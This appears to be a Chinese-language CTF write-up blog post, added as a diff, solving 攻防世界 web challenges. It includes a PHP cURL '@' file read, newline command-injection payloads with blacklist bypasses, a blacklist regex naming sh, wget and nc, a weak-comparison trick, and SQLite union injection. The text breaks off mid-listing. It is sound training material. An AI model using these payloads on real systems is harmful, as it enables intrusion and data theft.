@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>攻防世界web高手篇（021-025） - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="攻防世界web高手篇（021-025）" />
+<meta property="og:description" content="0x00 Cat 题目描述：抓住那只猫 输入127.0.0.1或者0.0.0.0有回显，baidu.com等无回显，输入管道符等会被判定为Invalid URL F" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-17T06:43:49+00:00" />
+<meta property="article:modified_time" content="2021-09-17T06:43:49+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="攻防世界web高手篇（021-025）"/>
+<meta name="twitter:description" content="0x00 Cat 题目描述：抓住那只猫 输入127.0.0.1或者0.0.0.0有回显，baidu.com等无回显，输入管道符等会被判定为Invalid URL F"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" /><link rel="prev" href="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/" /><link rel="next" href="https://hannibal0x.github.io/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "攻防世界web高手篇（021-025）",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025\/"
+        },"genre": "posts","keywords": "CTF","wordcount":  3096 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025\/","datePublished": "2021-09-17T06:43:49+00:00","dateModified": "2021-09-17T06:43:49+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">攻防世界web高手篇（021-025）</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-09-17">2021-09-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3096 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-cat">0x00 Cat</a></li>
+    <li><a href="#0x01-favorite_number">0x01 favorite_number</a></li>
+    <li><a href="#0x02-lottery">0x02 lottery</a></li>
+    <li><a href="#0x03-flatscience">0x03 FlatScience</a></li>
+    <li><a href="#0x04-leaking">0x04 leaking</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-cat">0x00 Cat</h2>
+<p>题目描述：抓住那只猫</p>
+<p>输入127.0.0.1或者0.0.0.0有回显，baidu.com等无回显，输入管道符等会被判定为<code>Invalid URL</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="622" height="150" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-60.png" alt="" class="wp-image-3682" /> </figure></p>
+<p>FUZZ测试一下，<a rel="noreferrer noopener" href="https://blog.csdn.net/qq_17204441/article/details/102279118" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/qq_17204441/article/details/102279118" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/qq_17204441/article/details/102279118</a></a>，<code>wfuzz -w 字典 url?参数=FUZZ</code>，发现<code>@</code>没有被过滤<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1058" height="400" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-111.png" alt="" class="wp-image-3753" /> </figure></p>
+<p>输入字符编码，不会报错，但是<code>%80</code>会出错，因为django后端使用的gbk编码，ASCII码的编码范围0-127，%80相当于128 ，所以推断是由unicode解码失败导致的，将报错的代码复制出来，存为html打开，显示django的报错信息，包括请求方式、api接口等等。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1006" height="456" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-115.png" alt="" class="wp-image-3761" /> </figure></p>
+<p>这里补一个hint，RTFM of PHP CURL===&raquo;read the fuck manul of PHP CURL???，里面提到了PHP CURL的概念，参照<a rel="noreferrer noopener" href="https://jasonhzy.github.io/2016/05/04/php-curl-file/" target="_blank" rel="nofollow" ><a href="https://jasonhzy.github.io/2016/05/04/php-curl-file/" target="_blank" rel="noopener noreffer ">https://jasonhzy.github.io/2016/05/04/php-curl-file/</a></a>，可以知道PHP的cURL支持通过在数组数据中，使用“@+文件全路径”的语法附加文件，供cURL读取上传。</p>
+<p>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="775" height="265" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-116.png" alt="" class="wp-image-3762" /> </figure></p>
+<p>所以构造<code>@/opt/api/database.sqlite3</code>就可以利用CURLOPT_SAFE_UPLOAD为TRUE，禁用@前缀在 CURLOPT_POSTFIELDS 中发送文件的特性，把数据库文件的内容post给django，但是因为编码问题，报错了，就能够看到数据库里面的内容。为了方便观察，将代码再拷贝成html文件查看。得到flag。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1373" height="534" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-117.png" alt="" class="wp-image-3764" /> </figure></p>
+<h2 id="0x01-favorite_number">0x01 favorite_number</h2>
+<p>代码如下：</p>
+<pre class="wp-block-code"><code> &lt;?php
+//php5.5.9
+$stuff = $_POST&#91;"stuff"];
+$array = &#91;'admin', 'user'];
+if($stuff === $array && $stuff&#91;0] != 'admin') {
+    $num= $_POST&#91;"num"];
+    if (preg_match("/^\d+$/im",$num)){
+        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
+            echo "my favorite num is:";
+            system("echo ".$num);
+        }else{
+            echo 'Bonjour!';
+        }
+    }
+} else {
+    highlight_file(__FILE__);
+} </code></pre>
+<p>首先要求stuff强等于array，首元素还不能为‘admin’，php的版本应该是提示信息，查阅资料发现。可以利用PHP的数组下标的BUG实现整型溢出，<a rel="noreferrer noopener" href="https://segmentfault.com/q/1010000003871264" target="_blank" rel="nofollow" ><a href="https://segmentfault.com/q/1010000003871264" target="_blank" rel="noopener noreffer ">https://segmentfault.com/q/1010000003871264</a></a>，<a href="https://bugs.php.net/bug.php?id=69892" target="_blank"  rel="nofollow" ><a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener noreffer ">https://bugs.php.net/bug.php?id=69892</a></a>，所以能够构造。</p>
+<pre class="wp-block-code"><code>stuff&#91;4294967296]=admin&stuff&#91;1]=user&num=1
+stuff&#91;4294967296]=admin&stuff&#91;]=user&num=2
+stuff&#91;-4294967296]=admin&stuff&#91;1]=user&num=3
+stuff&#91;4294967296]=admin&stuff&#91;4294967297]=user&num=4
+
+2&lt;sup>32&lt;/sup>=4294967296</code></pre>
+<p>确实可以绕过第一个判断。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="167" height="22" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-123.png" alt="" class="wp-image-3777" /> </figure></p>
+<p>下面绕过数字的判断，可以使用换行符%0a绕过跨行匹配。注意：不能使用hackbar来执行payload，因为火狐浏览器会自动在换行符%0a前面加上回车符%0d，凑成%0d%0a，使绕过失败。于是构造<code>num=1%0als /</code>。发现了flag文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="815" height="453" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-125.png" alt="" class="wp-image-3779" /> </figure></p>
+<p>接着需要绕过黑名单。这里参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/zhengna/p/13962572.html" target="_blank" rel="nofollow" ><a href="https://www.cnblogs.com/zhengna/p/13962572.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/zhengna/p/13962572.html</a></a>，<a href="https://blog.csdn.net/rfrder/article/details/111482200" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://blog.csdn.net/rfrder/article/details/111482200" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/rfrder/article/details/111482200</a></a></p>
+<p><strong>方法1 用inode索引节点</strong></p>
+<p>先使用<code>ls -i /</code>命令寻找flag的inode号<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="191" height="346" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-126.png" alt="" class="wp-image-3781" /> </figure></p>
+<p>构造<code>num=1%0ahead `find / -inum 23593771`</code>，反引号绕过单双引号过滤。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="896" height="336" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-127.png" alt="" class="wp-image-3782" /> </figure></p>
+<p><strong>方法2 <strong>将文件名输出到文件里，然后执行文件。</strong></strong></p>
+<p>构造payload</p>
+<pre class="wp-block-code"><code>num=1%0aprintf /fla > /tmp/1;printf g >> /tmp/1;head `head /tmp/1`</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="874" height="350" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-129.png" alt="" class="wp-image-3784" /> </figure></p>
+<p><strong>方法3 变量拼接</strong></p>
+<p>构造<code>num=1%0ax=/fla;y=g;tac $x$y</code></p>
+<p>*<em>方法4 $<em>和$@</em></em></p>
+<pre class="wp-block-code"><code>$*和$@，$x(x 代表 1-9),${x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 
+在没有传入参数的情况下,这些特殊字符默认为空
+
+
+num=1%0aca$1t /fla$1g
+num=1%0aca$@t /fla$@g</code></pre>
+<h2 id="0x02-lottery">0x02 lottery</h2>
+<p>规则如下，输入7个数字，如果有相同的，会获得对应的奖励。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1128" height="521" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-131.png" alt="" class="wp-image-3787" /></figure></p>
+<p>flag也可以购买<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="289" height="426" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-132.png" alt="" class="wp-image-3788" /> </figure></p>
+<p>扫描发现存在git<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1050" height="398" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-134.png" alt="" class="wp-image-3790" /> </figure></p>
+<p>用githack下载下来<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="640" height="613" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-133.png" alt="" class="wp-image-3789" /> </figure></p>
+<p>审计代码发现在api.php中，存在php弱比较。</p>
+<pre class="wp-block-code"><code>	for($i=0; $i&lt;7; $i++){
+		if($numbers&#91;$i] == $win_numbers&#91;$i]){
+			$same_count++;
+		}
+	}</code></pre>
+<p>参照<a rel="noreferrer noopener" href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="nofollow" ><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener noreffer ">https://www.php.net/manual/zh/types.comparisons.php</a></a>，可以发现int型与true的比较结果都为true。最后构造<code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code>，成功得到奖金。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="542" height="489" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-135.png" alt="" class="wp-image-3791" /> </figure></p>
+<p>攒到足够的钱，买flag<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="756" height="554" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-136.png" alt="" class="wp-image-3792" /> </figure></p>
+<h2 id="0x03-flatscience">0x03 FlatScience</h2>
+<figure class="wp-block-image size-full is-resized">
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-137.png" alt="" class="wp-image-3794" width="539" height="353" /> </figure></p>
+<p>上扫描器，扫到了一些好东西。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="662" height="110" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-138.png" alt="" class="wp-image-3795" /> </figure></p>
+<p>发现管理员页面，提供了一个默认的账户名admin。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-139.png" alt="" class="wp-image-3796" width="374" height="282" /> </figure></p>
+<p>查看源码，发现hint，提示我们不要尝试绕过。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="477" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-140.png" alt="" class="wp-image-3799" /> </figure></p>
+<p>在login.php存在hint，猜测有debug的页面。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="390" height="21" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-141.png" alt="" class="wp-image-3800" /> </figure></p>
+<p>输入<code>url/?debug=1</code>，看到数据库为SQLite3。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="s1">&#39;../fancy.db&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;SELECT id,name from Users where name=&#39;&#34;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&#34;&#39; and password=&#39;&#34;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&#34;Salz!&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;Some Error occourred!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">60</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;login.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>SQLite数据库只有它本身一个数据库，有一个sqlite_master隐藏表，里面存放我们建表的记录。构造<code>' union select  name,sql  from sqlite_master--</code>抓包进行分析。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="971" height="366" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-145.png" alt="" class="wp-image-3806" /> </figure></p>
+<p>经过url解密得到信息</p>
+<pre class="wp-block-code"><code> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code></pre>
+<p>接着分别查询hint，name，password。结果如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">my fav word in my fav paper?!,my love isâ¦?,the password is password
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin,fritze,hansi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据admin的密码MD5值，查到ThinJerboaSalz!，所以密码为 ThinJerboa 。在管理员页面登录得到flag<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-146.png" alt="" class="wp-image-3807" width="385" height="342" /> </figure></p>
+<p>不过比赛时，应该解不出md5值的。根据hint，他的密码应该和pdf有关，使用网上的脚本，python3爬取多目标网页PDF文件并下载到指定目录：</p>
+<pre class="wp-block-code"><code>import requests
+import re
+import os
+import sys
+
+re1 = '&#91;a-fA-F0-9]{32,32}.pdf'
+re2 = '&#91;0-9\/]{2,2}index.html'
+
+pdf_list = &#91;]
+def get_pdf(url):
+    global pdf_list 
+    print(url)
+    req = requests.get(url).text
+    re_1 = re.findall(re1,req)
+    for i in re_1:
+        pdf_url = url+i
+        pdf_list.append(pdf_url)
+    re_2 = re.findall(re2,req)
+    for j in re_2:
+        new_url = url+j&#91;0:2]
+        get_pdf(new_url)
+    return pdf_list
+    # return re_2
+
+pdf_list = get_pdf('http://111.200.241.244:52051/')
+print(pdf_list)
+for i in pdf_list:
+    os.system('wget '+i)</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="963" height="640" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-147.png" alt="" class="wp-image-3808" /> </figure></p>
+<p>然后识别PDF内容并进行密码对冲，这里有一个坑，/pdfminer/converter.py中的line 49, self.pageno += 1需要修改为self.pageno += str(1)。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
